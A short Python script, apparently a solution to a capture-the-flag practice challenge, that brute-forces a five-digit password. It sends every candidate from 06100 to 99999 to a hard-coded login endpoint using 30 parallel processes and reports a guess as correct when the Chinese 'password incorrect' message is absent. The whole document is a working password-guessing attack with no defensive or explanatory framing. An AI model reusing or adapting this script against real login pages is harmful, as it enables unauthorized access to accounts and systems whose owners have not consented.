# -*- coding: utf-8 -*-

import sys
import multiprocessing
import requests


def try_one(pd):
    res = requests.post('http://123.206.87.240:8002/baopo/?yes', data={'pwd': pd})
    res.encoding = 'UTF-8'
    if '密码不正确' not in res.text:
        print(pd, end='')
        print('密码正确!!!')
    if int(pd) % 100 == 0:
        print(pd)


if __name__ == '__main__':
    pool = multiprocessing.Pool(processes=30)
    for i in range(6100, 100000):
        index = '%05d' % i
        pool.apply_async(try_one, args=(index,))

    pool.close()
    pool.join()
